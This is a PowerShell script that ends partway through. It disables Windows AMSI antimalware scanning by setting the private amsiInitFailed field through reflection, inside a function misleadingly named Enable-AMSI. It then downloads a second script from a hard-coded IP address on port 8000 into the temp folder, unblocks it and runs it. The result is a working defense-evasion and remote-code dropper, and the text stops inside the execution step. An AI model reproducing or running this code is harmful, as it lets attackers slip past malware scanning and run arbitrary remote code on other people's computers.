
function Enable-AMSI {
    try {
        if (-not [System.Management.Automation.AmsiUtils]::amsiInitFailed) {
            \$asm = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
            $field = $asm.GetField('amsiInitFailed', 'NonPublic,Static')
            \$field.SetValue(\$null, \$true)
            Write-Host "[+] AMSI Bypass Successful"
        }
    } catch {
        Write-Warning "[!] AMSI Bypass failed: \$_"
    }
}

\$scriptUrl = "http://20.211.55.5:8000/try.ps1"
$tempOutputPath = Join-Path $env:TEMP "downloaded_script.ps1"

function Invoke-RemoteDownload {
    param([string]$Url, [string]$Destination)

    try {
       
        Invoke-RestMethod -Uri \$Url -Method Get -OutFile \$Destination -ErrorAction Stop
        
        if (Test-Path \$Destination) {
            Write-Host "[+] Download complete: \$Destination"
            return \$true
        }
    } catch {
        Write-Error "Download failed: $($_.Exception.Message)"
        return \$false
    }
    return \$false
}


function Invoke-ScriptExecution {
    param([string]\$ScriptPath)

    if (-not (Test-Path \$ScriptPath)) {
        Write-Error "Script file not found at: \$ScriptPath"
        return
    }

    try {
      
        Unblock-File -Path \$ScriptPath -ErrorAction SilentlyContinue

        Write-Host "[*] Executing script..."
      
        & \$ScriptPath
